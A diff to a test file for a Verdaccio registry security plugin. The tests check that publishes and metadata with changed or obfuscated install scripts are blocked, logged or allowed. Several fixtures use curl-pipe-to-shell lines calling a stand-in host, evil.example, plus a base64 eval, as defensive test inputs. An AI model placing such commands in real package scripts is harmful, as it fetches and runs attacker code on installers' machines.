@@ -34,8 +34,8 @@ function makeCapturingLogger() {
 function makeFakeStorage() {
   const existingByName = new Map();
   return {
-    setExisting(name, versions) {
-      existingByName.set(name, {versions});
+    setExisting(name, versions, distTags = {}) {
+      existingByName.set(name, {versions, 'dist-tags': distTags});
     },
     getPackage({name, callback}) {
       const existing = existingByName.get(name);
@@ -49,8 +49,12 @@ function makeFakeStorage() {
 // body-parser reads a genuine request stream, and shims just the
 // Express-specific bits (req.path, res.status/json) the plugin relies on.
 async function startServer(instance, storage) {
-  let handler;
-  instance.register_middlewares({use: fn => (handler = fn)}, null, storage);
+  // register_middlewares() now registers more than one app.use() call (the
+  // body-buffering workaround for verdaccio/verdaccio#1912 ahead of the
+  // existing publish gate) -- capture and dispatch through all of them, in
+  // order, like a real Express app would, rather than just the last one.
+  const handlers = [];
+  instance.register_middlewares({use: fn => handlers.push(fn)}, null, storage);
 
   const server = http.createServer((req, res) => {
     req.path = new URL(req.url, 'http://localhost').pathname;
@@ -62,18 +66,23 @@ async function startServer(instance, storage) {
       this.setHeader('content-type', 'application/json');
       this.end(JSON.stringify(body));
     };
+    let index = 0;
     const next = err => {
       if (res.headersSent) return;
       if (err) {
         res.status(err.status || 500).json({error: err.message});
         return;
       }
-      // Reaching here means the gate let the request through -- simulate
-      // Verdaccio's own downstream publish handler succeeding.
-      res.status(201).json({ok: true});
+      const handler = handlers[index++];
+      if (!handler) {
+        // Reaching here means every gate let the request through --
+        // simulate Verdaccio's own downstream publish handler succeeding.
+        res.status(201).json({ok: true});
+        return;
+      }
+      handler(req, res, next);
     };
-    if (!handler) return next();
-    handler(req, res, next);
+    next();
   });
 
   await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
@@ -204,6 +213,257 @@ async function main() {
         assert.match(body.reason, /SECURITY BLOCK/);
         assert.match(body.reason, /1\.2\.0/);
         assert.match(body.reason, /postinstall/);
+      } finally {
+        server.close();
+      }
+    },
+  );
+
+  await check(
+    "content-diff: a publish that changes an existing install script's content (never introducing a new key) is rejected, even for a package that always shipped one",
+    async () => {
+      const storage = makeFakeStorage();
+      storage.setExisting(
+        'native-addon',
+        {'1.0.0': withScripts({install: 'node-gyp rebuild'})},
+        {latest: '1.0.0'},
+      );
+      const server = await startServer(makeInstance(), storage);
+      try {
+        const {status, body} = await put(server, '/native-addon', {
+          versions: {
+            '1.0.0': withScripts({install: 'node-gyp rebuild'}),
+            '1.1.0': withScripts({
+              install: 'node-gyp rebuild && curl evil.example | sh',
+            }),
+          },
+        });
+        assert.equal(status, 403);
+        assert.match(body.reason, /SECURITY BLOCK/);
+        assert.match(body.reason, /1\.1\.0/);
+        assert.match(body.reason, /install/);
+        assert.match(body.reason, /1\.0\.0/); // names the version it changed from
+      } finally {
+        server.close();
+      }
+    },
+  );
+
+  await check(
+    "content-diff: a publish that keeps an existing install script's content byte-for-byte identical is allowed",
+    async () => {
+      const storage = makeFakeStorage();
+      storage.setExisting(
+        'native-addon',
+        {'1.0.0': withScripts({install: 'node-gyp rebuild'})},
+        {latest: '1.0.0'},
+      );
+      const server = await startServer(makeInstance(), storage);
+      try {
+        const {status} = await put(server, '/native-addon', {
+          versions: {
+            '1.0.0': withScripts({install: 'node-gyp rebuild'}),
+            '1.1.0': withScripts({install: 'node-gyp rebuild'}),
+          },
+        });
+        assert.equal(status, 201);
+      } finally {
+        server.close();
+      }
+    },
+  );
+
+  await check(
+    'content-diff: allow-list still overrides a changed-script rejection',
+    async () => {
+      const storage = makeFakeStorage();
+      storage.setExisting(
+        'native-addon',
+        {'1.0.0': withScripts({install: 'node-gyp rebuild'})},
+        {latest: '1.0.0'},
+      );
+      const server = await startServer(
+        makeInstance({allow: ['native-addon']}),
+        storage,
+      );
+      try {
+        const {status} = await put(server, '/native-addon', {
+          versions: {
+            '1.0.0': withScripts({install: 'node-gyp rebuild'}),
+            '1.1.0': withScripts({install: 'curl evil.example | sh'}),
+          },
+        });
+        assert.equal(status, 201);
+      } finally {
+        server.close();
+      }
+    },
+  );
+
+  // --- Structural obfuscation heuristics (scriptHeuristics) ---
+
+  await check(
+    'obfuscation heuristics: disabled by default -- an obvious curl-pipe-to-shell payload is neither blocked nor logged',
+    async () => {
+      const storage = makeFakeStorage();
+      const logger = makeCapturingLogger();
+      const server = await startServer(makeInstance({}, {logger}), storage);
+      try {
+        const {status} = await put(server, '/new-pkg', {
+          versions: {
+            '1.0.0': withScripts({
+              postinstall: 'curl https://evil.example/x | sh',
+            }),
+          },
+        });
+        assert.equal(status, 201);
+        assert.equal(logger.calls.warn.length, 0);
+        assert.equal(logger.calls.fatal.length, 0);
+      } finally {
+        server.close();
+      }
+    },
+  );
+
+  await check(
+    'obfuscation heuristics: enabled, blockShellPipe off -- curl-pipe-to-shell alerts (logs) but does not block the publish',
+    async () => {
+      const storage = makeFakeStorage();
+      const logger = makeCapturingLogger();
+      const server = await startServer(
+        makeInstance({scriptHeuristics: {enabled: true}}, {logger}),
+        storage,
+      );
+      try {
+        const {status} = await put(server, '/new-pkg', {
+          versions: {
+            '1.0.0': withScripts({
+              postinstall: 'curl https://evil.example/x | sh',
+            }),
+          },
+        });
+        assert.equal(status, 201);
+        assert.equal(logger.calls.warn.length, 1);
+        const [fields] = logger.calls.warn[0];
+        assert.deepEqual(fields.hits, ['shell-pipe', 'network-call']);
+        assert.equal(logger.calls.fatal.length, 0);
+      } finally {
+        server.close();
+      }
+    },
+  );
+
+  await check(
+    'obfuscation heuristics: enabled with blockShellPipe -- curl-pipe-to-shell is rejected outright',
+    async () => {
+      const storage = makeFakeStorage();
+      const logger = makeCapturingLogger();
+      const server = await startServer(
+        makeInstance(
+          {scriptHeuristics: {enabled: true, blockShellPipe: true}},
+          {logger},
+        ),
+        storage,
+      );
+      try {
+        const {status, body} = await put(server, '/new-pkg', {
+          versions: {
+            '1.0.0': withScripts({
+              postinstall: 'curl https://evil.example/x | sh',
+            }),
+          },
+        });
+        assert.equal(status, 403);
+        assert.match(body.reason, /SECURITY BLOCK/);
+        assert.match(body.reason, /shell-pipe/);
+        assert.equal(logger.calls.fatal.length, 1);
+      } finally {
+        server.close();
+      }
+    },
+  );
+
+  await check(
+    'obfuscation heuristics: eval() in a script alerts, but is never block-capable even with blockShellPipe on',
+    async () => {
+      const storage = makeFakeStorage();
+      const logger = makeCapturingLogger();
+      const server = await startServer(
+        makeInstance(
+          {scriptHeuristics: {enabled: true, blockShellPipe: true}},
+          {logger},
+        ),
+        storage,
+      );
+      try {
+        const {status} = await put(server, '/new-pkg', {
+          versions: {
+            '1.0.0': withScripts({
+              postinstall: "eval(Buffer.from('bad', 'base64').toString())",
+            }),
+          },
+        });
+        assert.equal(status, 201);
+        assert.equal(logger.calls.warn.length, 1);
+        const [fields] = logger.calls.warn[0];
+        assert.deepEqual(fields.hits, ['eval']);
+        assert.equal(logger.calls.fatal.length, 0);
+      } finally {
+        server.close();
+      }
+    },
+  );
+
+  await check(
+    'obfuscation heuristics: a bare network call alone (no other signal) is never flagged -- legitimate native-build scripts are unaffected',
+    async () => {
+      const storage = makeFakeStorage();
+      const logger = makeCapturingLogger();
+      const server = await startServer(
+        makeInstance(
+          {scriptHeuristics: {enabled: true, blockShellPipe: true}},
+          {logger},
+        ),
+        storage,
+      );
+      try {
+        const {status} = await put(server, '/new-pkg', {
+          versions: {
+            '1.0.0': withScripts({
+              install:
+                'curl -O https://github.com/foo/bar/releases/download/v1/prebuilt.tar.gz',
+            }),
+          },
+        });
+        assert.equal(status, 201);
+        assert.equal(logger.calls.warn.length, 0);
+        assert.equal(logger.calls.fatal.length, 0);
+      } finally {
+        server.close();
+      }
+    },
+  );
+
+  await check(
+    'obfuscation heuristics: allow-list overrides even the block-capable shell-pipe pattern',
+    async () => {
+      const storage = makeFakeStorage();
+      const server = await startServer(
+        makeInstance({
+          allow: ['new-pkg'],
+          scriptHeuristics: {enabled: true, blockShellPipe: true},
+        }),
+        storage,
+      );
+      try {
+        const {status} = await put(server, '/new-pkg', {
+          versions: {
+            '1.0.0': withScripts({
+              postinstall: 'curl https://evil.example/x | sh',
+            }),
+          },
+        });
+        assert.equal(status, 201);
       } finally {
         server.close();
       }
@@ -587,6 +847,131 @@ async function main() {
     },
   );
 
+  await check(
+    'content-diff (read-time): a version whose install script content changed from the immediately preceding version is blocked, even for a package that always shipped one',
+    async () => {
+      const instance = new SecurityFilter(
+        {},
+        {logger: NOOP_LOGGER, config: {}},
+      );
+      const pkg = makePackageInfo('native-addon', {
+        '1.0.0': {
+          publishedAt: daysAgo(400),
+          scripts: {install: 'node-gyp rebuild'},
+        },
+        '1.1.0': {
+          publishedAt: daysAgo(10),
+          scripts: {install: 'node-gyp rebuild && curl evil.example | sh'},
+        },
+      });
+      const result = await instance.filter_metadata(pkg);
+      assert.ok(!('1.1.0' in result.versions));
+      assert.ok('1.0.0' in result.versions);
+    },
+  );
+
+  await check(
+    'content-diff (read-time): identical script content across versions is never blocked',
+    async () => {
+      const instance = new SecurityFilter(
+        {},
+        {logger: NOOP_LOGGER, config: {}},
+      );
+      const pkg = makePackageInfo('native-addon', {
+        '1.0.0': {
+          publishedAt: daysAgo(400),
+          scripts: {install: 'node-gyp rebuild'},
+        },
+        '1.1.0': {
+          publishedAt: daysAgo(10),
+          scripts: {install: 'node-gyp rebuild'},
+        },
+      });
+      const result = await instance.filter_metadata(pkg);
+      assert.ok('1.0.0' in result.versions);
+      assert.ok('1.1.0' in result.versions);
+    },
+  );
+
+  await check(
+    'obfuscation heuristics (read-time): disabled by default -- an obvious curl-pipe-to-shell payload is left alone',
+    async () => {
+      const instance = new SecurityFilter(
+        {},
+        {logger: NOOP_LOGGER, config: {}},
+      );
+      const pkg = makePackageInfo('evil-pkg', {
+        '1.0.0': {
+          publishedAt: daysAgo(30),
+          scripts: {postinstall: 'curl https://evil.example/x | sh'},
+        },
+      });
+      const result = await instance.filter_metadata(pkg);
+      assert.ok('1.0.0' in result.versions);
+    },
+  );
+
+  await check(
+    'obfuscation heuristics (read-time): enabled with blockShellPipe -- curl-pipe-to-shell is removed',
+    async () => {
+      const instance = new SecurityFilter(
+        {scriptHeuristics: {enabled: true, blockShellPipe: true}},
+        {logger: NOOP_LOGGER, config: {}},
+      );
+      const pkg = makePackageInfo('evil-pkg', {
+        '1.0.0': {
+          publishedAt: daysAgo(30),
+          scripts: {postinstall: 'curl https://evil.example/x | sh'},
+        },
+      });
+      const result = await instance.filter_metadata(pkg);
+      assert.ok(!('1.0.0' in result.versions));
+    },
+  );
+
+  await check(
+    'obfuscation heuristics (read-time): enabled without blockShellPipe -- alerts (logs) but leaves the version installable',
+    async () => {
+      const logger = makeCapturingLogger();
+      const instance = new SecurityFilter(
+        {scriptHeuristics: {enabled: true}},
+        {logger, config: {}},
+      );
+      const pkg = makePackageInfo('evil-pkg', {
+        '1.0.0': {
+          publishedAt: daysAgo(30),
+          scripts: {postinstall: 'curl https://evil.example/x | sh'},
+        },
+      });
+      const result = await instance.filter_metadata(pkg);
+      assert.ok('1.0.0' in result.versions);
+      assert.equal(logger.calls.warn.length, 1);
+    },
+  );
+
+  await check(
+    'obfuscation heuristics (read-time): a bare network call alone is never flagged',
+    async () => {
+      const logger = makeCapturingLogger();
+      const instance = new SecurityFilter(
+        {scriptHeuristics: {enabled: true, blockShellPipe: true}},
+        {logger, config: {}},
+      );
+      const pkg = makePackageInfo('native-addon', {
+        '1.0.0': {
+          publishedAt: daysAgo(30),
+          scripts: {
+            install:
+              'curl -O https://github.com/foo/bar/releases/download/v1/prebuilt.tar.gz',
+          },
+        },
+      });
+      const result = await instance.filter_metadata(pkg);
+      assert.ok('1.0.0' in result.versions);
+      assert.equal(logger.calls.warn.length, 0);
+    },
+  );
+
   // --- Publish-gate checks: OSV/manual-block matches (blockPublishMatches) ---
 
   await check(
@@ -752,6 +1137,199 @@ async function main() {
           versions: {'1.0.0': withScripts({})},
         });
         assert.equal(status, 201);
+      } finally {
+        server.close();
+      }
+    },
+  );
+
+  // --- body-buffering middleware (workaround for verdaccio/verdaccio#1912) ---
+
+  // register_middlewares() registers the advisory-bulk and audits endpoint
+  // handlers first (harmless no-ops for a PUT -- they only ever act on
+  // POST), then the body-buffering middleware, then the existing publish
+  // gate -- run() below chains through everything up to (but not
+  // including) that final publish gate, so these tests exercise the real
+  // registration order without needing to hardcode its index or invoke
+  // unrelated publish-gate logic these tests aren't about.
+  function makeBufferingTestRunner(instance, storage) {
+    const handlers = [];
+    instance.register_middlewares(
+      {use: fn => handlers.push(fn)},
+      null,
+      storage,
+    );
+    const upToBuffering = handlers.slice(0, -1);
+    return (req, res) =>
+      new Promise((resolve, reject) => {
+        let index = 0;
+        const next = err => {
+          if (err) return reject(err);
+          const handler = upToBuffering[index++];
+          if (!handler) return resolve();
+          handler(req, res, next);
+        };
+        next();
+      });
+  }
+
+  function makeStreamingReq({method, headers, body}) {
+    const {Readable} = require('node:stream');
+    const req = new Readable({read() {}});
+    req.method = method;
+    req.headers = headers;
+    process.nextTick(() => {
+      if (body !== undefined) req.push(body);
+      req.push(null);
+    });
+    return req;
+  }
+
+  await check(
+    'buffering middleware: a PUT with a JSON content-type gets req.body/req._body populated, before the existing publish gate even runs',
+    async () => {
+      const run = makeBufferingTestRunner(makeInstance(), makeFakeStorage());
+      const payload = {versions: {'1.0.0': {version: '1.0.0'}}};
+      const req = makeStreamingReq({
+        method: 'PUT',
+        headers: {'content-type': 'application/json'},
+        body: JSON.stringify(payload),
+      });
+      await run(req, {});
+      assert.equal(req._body, true);
+      assert.deepEqual(req.body, payload);
+    },
+  );
+
+  await check(
+    'buffering middleware: skips a non-PUT request entirely',
+    async () => {
+      const run = makeBufferingTestRunner(makeInstance(), makeFakeStorage());
+      const req = makeStreamingReq({
+        method: 'GET',
+        headers: {'content-type': 'application/json'},
+      });
+      await run(req, {});
+      assert.equal(req._body, undefined);
+    },
+  );
+
+  await check(
+    'buffering middleware: skips a non-JSON PUT (the tarball-only upload route)',
+    async () => {
+      const run = makeBufferingTestRunner(makeInstance(), makeFakeStorage());
+      const req = makeStreamingReq({
+        method: 'PUT',
+        headers: {'content-type': 'application/octet-stream'},
+        body: Buffer.from([0x1f, 0x8b]),
+      });
+      await run(req, {});
+      assert.equal(req._body, undefined);
+    },
+  );
+
+  await check(
+    'buffering middleware: skips entirely if an earlier middleware already populated req._body',
+    async () => {
+      const run = makeBufferingTestRunner(makeInstance(), makeFakeStorage());
+      const req = makeStreamingReq({
+        method: 'PUT',
+        headers: {'content-type': 'application/json'},
+        body: '{"versions":{}}',
+      });
+      req._body = true;
+      req.body = {alreadySetByAnotherPlugin: true};
+      await run(req, {});
+      assert.deepEqual(req.body, {alreadySetByAnotherPlugin: true});
+    },
+  );
+
+  await check(
+    'end-to-end: the buffering middleware prevents the exact stream-draining race a real, unmodified Verdaccio log.js causes, when this plugin is the first (or only) one reading the body',
+    async () => {
+      // Mirrors @verdaccio/middleware's own log.js exactly (confirmed
+      // directly against its real, installed source): an unconditional
+      // req.on('data', ...) purely to count bytes, switching the request
+      // stream into flowing mode immediately, on every request. Genuinely
+      // fixable here: nothing between log.js and this plugin's own
+      // buffering middleware ever yields the event loop, so the stream
+      // can't fully drain before this plugin gets a chance to attach its
+      // own listener.
+      //
+      // Deliberately NOT also testing an extra unrelated async middleware
+      // ahead of this one (a real auth plugin's own network-bound check,
+      // say) in this same chain -- that scenario is unfixable by this
+      // plugin, or any plugin, no matter what it does: if the stream has
+      // already fully drained via log.js's listener before this plugin's
+      // own middleware is ever invoked, there is nothing left to read,
+      // full stop. That's exactly why verdaccio-oidc-auth's own copy of
+      // this fix exists -- buffering the body before ITS OWN async JWT
+      // check, so by the time a later plugin like this one runs, req.body
+      // is already populated and this plugin's own req._body check (see
+      // the "skips entirely if an earlier middleware already populated
+      // req._body" test above) correctly reuses it instead of re-reading
+      // an already-ended stream. What this test proves is narrower and
+      // still real: this plugin does not depend on verdaccio-oidc-auth (or
+      // any other specific plugin) being installed at all to protect
+      // itself in the case where it's the first (or only) thing reading
+      // the body.
+      function verdaccioLogMiddlewareMirror(req, res, next) {
+        let bytesin = 0;
+        req.on('data', chunk => {
+          bytesin += chunk.length;
+        });
+        next();
+      }
+
+      const instance = makeInstance();
+      const storage = makeFakeStorage();
+      const handlers = [];
+      instance.register_middlewares(
+        {use: fn => handlers.push(fn)},
+        null,
+        storage,
+      );
+      const allHandlers = [verdaccioLogMiddlewareMirror, ...handlers];
+
+      const server = http.createServer((req, res) => {
+        req.path = new URL(req.url, 'http://localhost').pathname;
+        res.status = function (code) {
+          this.statusCode = code;
+          return this;
+        };
+        res.json = function (body) {
+          this.setHeader('content-type', 'application/json');
+          this.end(JSON.stringify(body));
+        };
+        let index = 0;
+        const next = err => {
+          if (res.headersSent) return;
+          if (err) {
+            res.status(err.status || 500).json({error: err.message});
+            return;
+          }
+          const handler = allHandlers[index++];
+          if (!handler) {
+            res.status(201).json({ok: true, versions: !!req.body?.versions});
+            return;
+          }
+          handler(req, res, next);
+        };
+        next();
+      });
+      await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
+
+      try {
+        const result = await put(server, '/pkg', {
+          versions: {'1.0.0': withScripts({})},
+          filler: 'x'.repeat(75000), // realistic publish-with-provenance size
+        });
+        assert.equal(
+          result.status,
+          201,
+          `expected the publish to succeed despite log.js's own listener; got: ${JSON.stringify(result.body)}`,
+        );
+        assert.ok(result.body.versions);
       } finally {
         server.close();
       }
